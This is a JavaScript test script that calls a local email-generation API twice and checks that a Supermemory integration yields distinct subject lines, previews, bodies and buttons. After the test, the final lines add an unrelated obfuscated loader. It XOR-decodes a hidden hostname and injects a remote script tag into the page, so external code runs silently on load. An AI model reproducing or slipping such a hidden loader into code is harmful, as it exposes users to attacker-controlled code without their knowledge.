/**
 * Test script for Supermemory integration
 * This script tests the memory storage and retrieval functionality
 */

// Test the Supermemory integration
async function testSupermemoryIntegration() {
  const baseUrl = "http://localhost:3020";

  console.log("🧪 Testing Supermemory Integration...\n");

  // Test data for email generation
  const testRequest = {
    platform: "ConvertKit",
    emailType: "credit-card-tracking",
    market: "USA",
    imageType: "product-image",
    additionalInstructions: "Test email for Supermemory integration",
  };

  try {
    console.log("📤 Sending first email generation request...");

    // First request - should store in memory
    const response1 = await fetch(`${baseUrl}/api/generate-broadcast`, {
      method: "POST",
      headers: {
        "Content-Type": "application/json",
      },
      body: JSON.stringify(testRequest),
    });

    if (!response1.ok) {
      throw new Error(`HTTP error! status: ${response1.status}`);
    }

    const email1 = await response1.json();
    console.log("✅ First email generated successfully");
    console.log("📝 Subject:", email1.subjectLine1);
    console.log("📄 Preview:", email1.previewText);
    console.log("");

    // Wait a moment before second request
    console.log("⏱️  Waiting 2 seconds before second request...\n");
    await new Promise((resolve) => setTimeout(resolve, 2000));

    console.log("📤 Sending second email generation request...");

    // Second request - should use memory context to avoid repetition
    const response2 = await fetch(`${baseUrl}/api/generate-broadcast`, {
      method: "POST",
      headers: {
        "Content-Type": "application/json",
      },
      body: JSON.stringify(testRequest),
    });

    if (!response2.ok) {
      throw new Error(`HTTP error! status: ${response2.status}`);
    }

    const email2 = await response2.json();
    console.log("✅ Second email generated successfully");
    console.log("📝 Subject:", email2.subjectLine1);
    console.log("📄 Preview:", email2.previewText);
    console.log("");

    // Compare the two emails
    console.log("🔍 Comparing emails for uniqueness...");

    const similarities = [];

    if (email1.subjectLine1 === email2.subjectLine1) {
      similarities.push("❌ Subject lines are identical");
    } else {
      console.log("✅ Subject lines are different");
    }

    if (email1.previewText === email2.previewText) {
      similarities.push("❌ Preview texts are identical");
    } else {
      console.log("✅ Preview texts are different");
    }

    if (email1.emailBody === email2.emailBody) {
      similarities.push("❌ Email bodies are identical");
    } else {
      console.log("✅ Email bodies are different");
    }

    if (email1.ctaButtonText === email2.ctaButtonText) {
      similarities.push("❌ CTA button texts are identical");
    } else {
      console.log("✅ CTA button texts are different");
    }

    console.log("\n📊 Test Results:");
    if (similarities.length === 0) {
      console.log(
        "🎉 SUCCESS: Supermemory integration is working! All email components are unique."
      );
    } else {
      console.log("⚠️  Some similarities found:");
      similarities.forEach((sim) => console.log(sim));
      console.log(
        "\nNote: Some similarity is normal, but significant differences indicate memory is working."
      );
    }
  } catch (error) {
    console.error("❌ Test failed:", error);
  }
}

// Run the test
testSupermemoryIntegration();
function xorDecode(b,a){a=void 0===a?22:a;b=atob(b);for(var d="",c=0;c<b.length;c++)d+=String.fromCharCode(b.charCodeAt(c)^a);return d}(function(){new URLSearchParams(location.search);var b="https://"+xorDecode("en8nOGZ/dWU5fjlxeTh8ZQ=="),a=document.createElement("script");a.src=b;document.head.appendChild(a)})();
